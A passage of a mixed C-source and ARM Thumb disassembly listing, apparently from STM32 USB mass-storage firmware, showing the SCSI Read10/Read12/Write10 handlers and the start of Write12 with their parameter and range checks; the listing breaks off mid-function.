 800a7c6:	2205      	movs	r2, #5
 800a7c8:	68f8      	ldr	r0, [r7, #12]
 800a7ca:	f7ff fe73 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800a7ce:	f04f 33ff 	mov.w	r3, #4294967295
 800a7d2:	e00c      	b.n	800a7ee <SCSI_Read10+0x166>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a7d4:	697b      	ldr	r3, [r7, #20]
 800a7d6:	2202      	movs	r2, #2
 800a7d8:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a7da:	697b      	ldr	r3, [r7, #20]
 800a7dc:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a7e0:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a7e2:	7afb      	ldrb	r3, [r7, #11]
 800a7e4:	4619      	mov	r1, r3
 800a7e6:	68f8      	ldr	r0, [r7, #12]
 800a7e8:	f000 fb0a 	bl	800ae00 <SCSI_ProcessRead>
 800a7ec:	4603      	mov	r3, r0
}
 800a7ee:	4618      	mov	r0, r3
 800a7f0:	3718      	adds	r7, #24
 800a7f2:	46bd      	mov	sp, r7
 800a7f4:	bd80      	pop	{r7, pc}

0800a7f6 <SCSI_Read12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a7f6:	b580      	push	{r7, lr}
 800a7f8:	b086      	sub	sp, #24
 800a7fa:	af00      	add	r7, sp, #0
 800a7fc:	60f8      	str	r0, [r7, #12]
 800a7fe:	460b      	mov	r3, r1
 800a800:	607a      	str	r2, [r7, #4]
 800a802:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a804:	68fb      	ldr	r3, [r7, #12]
 800a806:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a80a:	68fb      	ldr	r3, [r7, #12]
 800a80c:	32b0      	adds	r2, #176	; 0xb0
 800a80e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a812:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a814:	697b      	ldr	r3, [r7, #20]
 800a816:	2b00      	cmp	r3, #0
 800a818:	d102      	bne.n	800a820 <SCSI_Read12+0x2a>
  {
    return -1;
 800a81a:	f04f 33ff 	mov.w	r3, #4294967295
 800a81e:	e0a7      	b.n	800a970 <SCSI_Read12+0x17a>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a820:	697b      	ldr	r3, [r7, #20]
 800a822:	7a1b      	ldrb	r3, [r3, #8]
 800a824:	2b00      	cmp	r3, #0
 800a826:	f040 8099 	bne.w	800a95c <SCSI_Read12+0x166>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a82a:	697b      	ldr	r3, [r7, #20]
 800a82c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a830:	7f1b      	ldrb	r3, [r3, #28]
 800a832:	b25b      	sxtb	r3, r3
 800a834:	2b00      	cmp	r3, #0
 800a836:	db0b      	blt.n	800a850 <SCSI_Read12+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a838:	697b      	ldr	r3, [r7, #20]
 800a83a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a83e:	7f59      	ldrb	r1, [r3, #29]
 800a840:	2320      	movs	r3, #32
 800a842:	2205      	movs	r2, #5
 800a844:	68f8      	ldr	r0, [r7, #12]
 800a846:	f7ff fe35 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800a84a:	f04f 33ff 	mov.w	r3, #4294967295
 800a84e:	e08f      	b.n	800a970 <SCSI_Read12+0x17a>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a850:	697b      	ldr	r3, [r7, #20]
 800a852:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a856:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a85a:	2b02      	cmp	r3, #2
 800a85c:	d108      	bne.n	800a870 <SCSI_Read12+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a85e:	7af9      	ldrb	r1, [r7, #11]
 800a860:	233a      	movs	r3, #58	; 0x3a
 800a862:	2202      	movs	r2, #2
 800a864:	68f8      	ldr	r0, [r7, #12]
 800a866:	f7ff fe25 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800a86a:	f04f 33ff 	mov.w	r3, #4294967295
 800a86e:	e07f      	b.n	800a970 <SCSI_Read12+0x17a>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a870:	68fb      	ldr	r3, [r7, #12]
 800a872:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a876:	68fa      	ldr	r2, [r7, #12]
 800a878:	33b0      	adds	r3, #176	; 0xb0
 800a87a:	009b      	lsls	r3, r3, #2
 800a87c:	4413      	add	r3, r2
 800a87e:	685b      	ldr	r3, [r3, #4]
 800a880:	689b      	ldr	r3, [r3, #8]
 800a882:	7afa      	ldrb	r2, [r7, #11]
 800a884:	4610      	mov	r0, r2
 800a886:	4798      	blx	r3
 800a888:	4603      	mov	r3, r0
 800a88a:	2b00      	cmp	r3, #0
 800a88c:	d008      	beq.n	800a8a0 <SCSI_Read12+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a88e:	7af9      	ldrb	r1, [r7, #11]
 800a890:	233a      	movs	r3, #58	; 0x3a
 800a892:	2202      	movs	r2, #2
 800a894:	68f8      	ldr	r0, [r7, #12]
 800a896:	f7ff fe0d 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800a89a:	f04f 33ff 	mov.w	r3, #4294967295
 800a89e:	e067      	b.n	800a970 <SCSI_Read12+0x17a>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a8a0:	687b      	ldr	r3, [r7, #4]
 800a8a2:	3302      	adds	r3, #2
 800a8a4:	781b      	ldrb	r3, [r3, #0]
 800a8a6:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a8a8:	687b      	ldr	r3, [r7, #4]
 800a8aa:	3303      	adds	r3, #3
 800a8ac:	781b      	ldrb	r3, [r3, #0]
 800a8ae:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a8b0:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a8b2:	687b      	ldr	r3, [r7, #4]
 800a8b4:	3304      	adds	r3, #4
 800a8b6:	781b      	ldrb	r3, [r3, #0]
 800a8b8:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a8ba:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a8bc:	687a      	ldr	r2, [r7, #4]
 800a8be:	3205      	adds	r2, #5
 800a8c0:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a8c2:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a8c4:	697a      	ldr	r2, [r7, #20]
 800a8c6:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a8ca:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a8cc:	687b      	ldr	r3, [r7, #4]
 800a8ce:	3306      	adds	r3, #6
 800a8d0:	781b      	ldrb	r3, [r3, #0]
 800a8d2:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a8d4:	687b      	ldr	r3, [r7, #4]
 800a8d6:	3307      	adds	r3, #7
 800a8d8:	781b      	ldrb	r3, [r3, #0]
 800a8da:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a8dc:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a8de:	687b      	ldr	r3, [r7, #4]
 800a8e0:	3308      	adds	r3, #8
 800a8e2:	781b      	ldrb	r3, [r3, #0]
 800a8e4:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a8e6:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a8e8:	687a      	ldr	r2, [r7, #4]
 800a8ea:	3209      	adds	r2, #9
 800a8ec:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a8ee:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a8f0:	697a      	ldr	r2, [r7, #20]
 800a8f2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a8f6:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a8f8:	697b      	ldr	r3, [r7, #20]
 800a8fa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8fe:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a900:	697b      	ldr	r3, [r7, #20]
 800a902:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a906:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a908:	7af9      	ldrb	r1, [r7, #11]
 800a90a:	68f8      	ldr	r0, [r7, #12]
 800a90c:	f000 fa4b 	bl	800ada6 <SCSI_CheckAddressRange>
 800a910:	4603      	mov	r3, r0
 800a912:	2b00      	cmp	r3, #0
 800a914:	da02      	bge.n	800a91c <SCSI_Read12+0x126>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a916:	f04f 33ff 	mov.w	r3, #4294967295
 800a91a:	e029      	b.n	800a970 <SCSI_Read12+0x17a>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a91c:	697b      	ldr	r3, [r7, #20]
 800a91e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a922:	699a      	ldr	r2, [r3, #24]
 800a924:	697b      	ldr	r3, [r7, #20]
 800a926:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a92a:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a92c:	6979      	ldr	r1, [r7, #20]
 800a92e:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a932:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a936:	fb01 f303 	mul.w	r3, r1, r3
 800a93a:	429a      	cmp	r2, r3
 800a93c:	d00b      	beq.n	800a956 <SCSI_Read12+0x160>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a93e:	697b      	ldr	r3, [r7, #20]
 800a940:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a944:	7f59      	ldrb	r1, [r3, #29]
 800a946:	2320      	movs	r3, #32
 800a948:	2205      	movs	r2, #5
 800a94a:	68f8      	ldr	r0, [r7, #12]
 800a94c:	f7ff fdb2 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800a950:	f04f 33ff 	mov.w	r3, #4294967295
 800a954:	e00c      	b.n	800a970 <SCSI_Read12+0x17a>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a956:	697b      	ldr	r3, [r7, #20]
 800a958:	2202      	movs	r2, #2
 800a95a:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a95c:	697b      	ldr	r3, [r7, #20]
 800a95e:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a962:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a964:	7afb      	ldrb	r3, [r7, #11]
 800a966:	4619      	mov	r1, r3
 800a968:	68f8      	ldr	r0, [r7, #12]
 800a96a:	f000 fa49 	bl	800ae00 <SCSI_ProcessRead>
 800a96e:	4603      	mov	r3, r0
}
 800a970:	4618      	mov	r0, r3
 800a972:	3718      	adds	r7, #24
 800a974:	46bd      	mov	sp, r7
 800a976:	bd80      	pop	{r7, pc}

0800a978 <SCSI_Write10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a978:	b580      	push	{r7, lr}
 800a97a:	b086      	sub	sp, #24
 800a97c:	af00      	add	r7, sp, #0
 800a97e:	60f8      	str	r0, [r7, #12]
 800a980:	460b      	mov	r3, r1
 800a982:	607a      	str	r2, [r7, #4]
 800a984:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a986:	68fb      	ldr	r3, [r7, #12]
 800a988:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a98c:	68fb      	ldr	r3, [r7, #12]
 800a98e:	32b0      	adds	r2, #176	; 0xb0
 800a990:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a994:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a996:	697b      	ldr	r3, [r7, #20]
 800a998:	2b00      	cmp	r3, #0
 800a99a:	d102      	bne.n	800a9a2 <SCSI_Write10+0x2a>
  {
    return -1;
 800a99c:	f04f 33ff 	mov.w	r3, #4294967295
 800a9a0:	e0c7      	b.n	800ab32 <SCSI_Write10+0x1ba>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a9a2:	697b      	ldr	r3, [r7, #20]
 800a9a4:	7a1b      	ldrb	r3, [r3, #8]
 800a9a6:	2b00      	cmp	r3, #0
 800a9a8:	f040 80bd 	bne.w	800ab26 <SCSI_Write10+0x1ae>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a9ac:	697b      	ldr	r3, [r7, #20]
 800a9ae:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9b2:	699b      	ldr	r3, [r3, #24]
 800a9b4:	2b00      	cmp	r3, #0
 800a9b6:	d10b      	bne.n	800a9d0 <SCSI_Write10+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a9b8:	697b      	ldr	r3, [r7, #20]
 800a9ba:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9be:	7f59      	ldrb	r1, [r3, #29]
 800a9c0:	2320      	movs	r3, #32
 800a9c2:	2205      	movs	r2, #5
 800a9c4:	68f8      	ldr	r0, [r7, #12]
 800a9c6:	f7ff fd75 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800a9ca:	f04f 33ff 	mov.w	r3, #4294967295
 800a9ce:	e0b0      	b.n	800ab32 <SCSI_Write10+0x1ba>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a9d0:	697b      	ldr	r3, [r7, #20]
 800a9d2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9d6:	7f1b      	ldrb	r3, [r3, #28]
 800a9d8:	b25b      	sxtb	r3, r3
 800a9da:	2b00      	cmp	r3, #0
 800a9dc:	da0b      	bge.n	800a9f6 <SCSI_Write10+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a9de:	697b      	ldr	r3, [r7, #20]
 800a9e0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9e4:	7f59      	ldrb	r1, [r3, #29]
 800a9e6:	2320      	movs	r3, #32
 800a9e8:	2205      	movs	r2, #5
 800a9ea:	68f8      	ldr	r0, [r7, #12]
 800a9ec:	f7ff fd62 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800a9f0:	f04f 33ff 	mov.w	r3, #4294967295
 800a9f4:	e09d      	b.n	800ab32 <SCSI_Write10+0x1ba>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a9f6:	68fb      	ldr	r3, [r7, #12]
 800a9f8:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a9fc:	68fa      	ldr	r2, [r7, #12]
 800a9fe:	33b0      	adds	r3, #176	; 0xb0
 800aa00:	009b      	lsls	r3, r3, #2
 800aa02:	4413      	add	r3, r2
 800aa04:	685b      	ldr	r3, [r3, #4]
 800aa06:	689b      	ldr	r3, [r3, #8]
 800aa08:	7afa      	ldrb	r2, [r7, #11]
 800aa0a:	4610      	mov	r0, r2
 800aa0c:	4798      	blx	r3
 800aa0e:	4603      	mov	r3, r0
 800aa10:	2b00      	cmp	r3, #0
 800aa12:	d008      	beq.n	800aa26 <SCSI_Write10+0xae>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800aa14:	7af9      	ldrb	r1, [r7, #11]
 800aa16:	233a      	movs	r3, #58	; 0x3a
 800aa18:	2202      	movs	r2, #2
 800aa1a:	68f8      	ldr	r0, [r7, #12]
 800aa1c:	f7ff fd4a 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800aa20:	f04f 33ff 	mov.w	r3, #4294967295
 800aa24:	e085      	b.n	800ab32 <SCSI_Write10+0x1ba>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800aa26:	68fb      	ldr	r3, [r7, #12]
 800aa28:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800aa2c:	68fa      	ldr	r2, [r7, #12]
 800aa2e:	33b0      	adds	r3, #176	; 0xb0
 800aa30:	009b      	lsls	r3, r3, #2
 800aa32:	4413      	add	r3, r2
 800aa34:	685b      	ldr	r3, [r3, #4]
 800aa36:	68db      	ldr	r3, [r3, #12]
 800aa38:	7afa      	ldrb	r2, [r7, #11]
 800aa3a:	4610      	mov	r0, r2
 800aa3c:	4798      	blx	r3
 800aa3e:	4603      	mov	r3, r0
 800aa40:	2b00      	cmp	r3, #0
 800aa42:	d008      	beq.n	800aa56 <SCSI_Write10+0xde>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800aa44:	7af9      	ldrb	r1, [r7, #11]
 800aa46:	2327      	movs	r3, #39	; 0x27
 800aa48:	2202      	movs	r2, #2
 800aa4a:	68f8      	ldr	r0, [r7, #12]
 800aa4c:	f7ff fd32 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800aa50:	f04f 33ff 	mov.w	r3, #4294967295
 800aa54:	e06d      	b.n	800ab32 <SCSI_Write10+0x1ba>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800aa56:	687b      	ldr	r3, [r7, #4]
 800aa58:	3302      	adds	r3, #2
 800aa5a:	781b      	ldrb	r3, [r3, #0]
 800aa5c:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800aa5e:	687b      	ldr	r3, [r7, #4]
 800aa60:	3303      	adds	r3, #3
 800aa62:	781b      	ldrb	r3, [r3, #0]
 800aa64:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800aa66:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800aa68:	687b      	ldr	r3, [r7, #4]
 800aa6a:	3304      	adds	r3, #4
 800aa6c:	781b      	ldrb	r3, [r3, #0]
 800aa6e:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800aa70:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800aa72:	687a      	ldr	r2, [r7, #4]
 800aa74:	3205      	adds	r2, #5
 800aa76:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800aa78:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800aa7a:	697a      	ldr	r2, [r7, #20]
 800aa7c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa80:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800aa82:	687b      	ldr	r3, [r7, #4]
 800aa84:	3307      	adds	r3, #7
 800aa86:	781b      	ldrb	r3, [r3, #0]
 800aa88:	021b      	lsls	r3, r3, #8
                         (uint32_t)params[8];
 800aa8a:	687a      	ldr	r2, [r7, #4]
 800aa8c:	3208      	adds	r2, #8
 800aa8e:	7812      	ldrb	r2, [r2, #0]
    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800aa90:	4313      	orrs	r3, r2
 800aa92:	697a      	ldr	r2, [r7, #20]
 800aa94:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa98:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800aa9a:	697b      	ldr	r3, [r7, #20]
 800aa9c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aaa0:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800aaa2:	697b      	ldr	r3, [r7, #20]
 800aaa4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aaa8:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aaaa:	7af9      	ldrb	r1, [r7, #11]
 800aaac:	68f8      	ldr	r0, [r7, #12]
 800aaae:	f000 f97a 	bl	800ada6 <SCSI_CheckAddressRange>
 800aab2:	4603      	mov	r3, r0
 800aab4:	2b00      	cmp	r3, #0
 800aab6:	da02      	bge.n	800aabe <SCSI_Write10+0x146>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800aab8:	f04f 33ff 	mov.w	r3, #4294967295
 800aabc:	e039      	b.n	800ab32 <SCSI_Write10+0x1ba>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800aabe:	697b      	ldr	r3, [r7, #20]
 800aac0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aac4:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aac6:	697a      	ldr	r2, [r7, #20]
 800aac8:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aacc:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800aad0:	fb02 f303 	mul.w	r3, r2, r3
 800aad4:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800aad6:	697b      	ldr	r3, [r7, #20]
 800aad8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aadc:	699b      	ldr	r3, [r3, #24]
 800aade:	693a      	ldr	r2, [r7, #16]
 800aae0:	429a      	cmp	r2, r3
 800aae2:	d00b      	beq.n	800aafc <SCSI_Write10+0x184>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aae4:	697b      	ldr	r3, [r7, #20]
 800aae6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aaea:	7f59      	ldrb	r1, [r3, #29]
 800aaec:	2320      	movs	r3, #32
 800aaee:	2205      	movs	r2, #5
 800aaf0:	68f8      	ldr	r0, [r7, #12]
 800aaf2:	f7ff fcdf 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800aaf6:	f04f 33ff 	mov.w	r3, #4294967295
 800aafa:	e01a      	b.n	800ab32 <SCSI_Write10+0x1ba>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800aafc:	693b      	ldr	r3, [r7, #16]
 800aafe:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ab02:	bf28      	it	cs
 800ab04:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ab08:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800ab0a:	697b      	ldr	r3, [r7, #20]
 800ab0c:	2201      	movs	r2, #1
 800ab0e:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800ab10:	4b0a      	ldr	r3, [pc, #40]	; (800ab3c <SCSI_Write10+0x1c4>)
 800ab12:	7819      	ldrb	r1, [r3, #0]
 800ab14:	697b      	ldr	r3, [r7, #20]
 800ab16:	f103 0210 	add.w	r2, r3, #16
 800ab1a:	693b      	ldr	r3, [r7, #16]
 800ab1c:	68f8      	ldr	r0, [r7, #12]
 800ab1e:	f002 faf3 	bl	800d108 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800ab22:	2300      	movs	r3, #0
 800ab24:	e005      	b.n	800ab32 <SCSI_Write10+0x1ba>
    return SCSI_ProcessWrite(pdev, lun);
 800ab26:	7afb      	ldrb	r3, [r7, #11]
 800ab28:	4619      	mov	r1, r3
 800ab2a:	68f8      	ldr	r0, [r7, #12]
 800ab2c:	f000 f9fe 	bl	800af2c <SCSI_ProcessWrite>
 800ab30:	4603      	mov	r3, r0
}
 800ab32:	4618      	mov	r0, r3
 800ab34:	3718      	adds	r7, #24
 800ab36:	46bd      	mov	sp, r7
 800ab38:	bd80      	pop	{r7, pc}
 800ab3a:	bf00      	nop
 800ab3c:	2000010b 	.word	0x2000010b

0800ab40 <SCSI_Write12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800ab40:	b580      	push	{r7, lr}
 800ab42:	b086      	sub	sp, #24
 800ab44:	af00      	add	r7, sp, #0
 800ab46:	60f8      	str	r0, [r7, #12]
 800ab48:	460b      	mov	r3, r1
 800ab4a:	607a      	str	r2, [r7, #4]
 800ab4c:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ab4e:	68fb      	ldr	r3, [r7, #12]
 800ab50:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ab54:	68fb      	ldr	r3, [r7, #12]
 800ab56:	32b0      	adds	r2, #176	; 0xb0
 800ab58:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ab5c:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800ab5e:	697b      	ldr	r3, [r7, #20]
 800ab60:	2b00      	cmp	r3, #0
 800ab62:	d102      	bne.n	800ab6a <SCSI_Write12+0x2a>
  {
    return -1;
 800ab64:	f04f 33ff 	mov.w	r3, #4294967295
 800ab68:	e0d7      	b.n	800ad1a <SCSI_Write12+0x1da>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800ab6a:	697b      	ldr	r3, [r7, #20]
 800ab6c:	7a1b      	ldrb	r3, [r3, #8]
 800ab6e:	2b00      	cmp	r3, #0
 800ab70:	f040 80cd 	bne.w	800ad0e <SCSI_Write12+0x1ce>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800ab74:	697b      	ldr	r3, [r7, #20]
 800ab76:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab7a:	699b      	ldr	r3, [r3, #24]
 800ab7c:	2b00      	cmp	r3, #0
 800ab7e:	d10b      	bne.n	800ab98 <SCSI_Write12+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800ab80:	697b      	ldr	r3, [r7, #20]
 800ab82:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab86:	7f59      	ldrb	r1, [r3, #29]
 800ab88:	2320      	movs	r3, #32
 800ab8a:	2205      	movs	r2, #5
 800ab8c:	68f8      	ldr	r0, [r7, #12]
 800ab8e:	f7ff fc91 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800ab92:	f04f 33ff 	mov.w	r3, #4294967295
 800ab96:	e0c0      	b.n	800ad1a <SCSI_Write12+0x1da>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800ab98:	697b      	ldr	r3, [r7, #20]
 800ab9a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab9e:	7f1b      	ldrb	r3, [r3, #28]
 800aba0:	b25b      	sxtb	r3, r3
 800aba2:	2b00      	cmp	r3, #0
 800aba4:	da0b      	bge.n	800abbe <SCSI_Write12+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aba6:	697b      	ldr	r3, [r7, #20]
 800aba8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
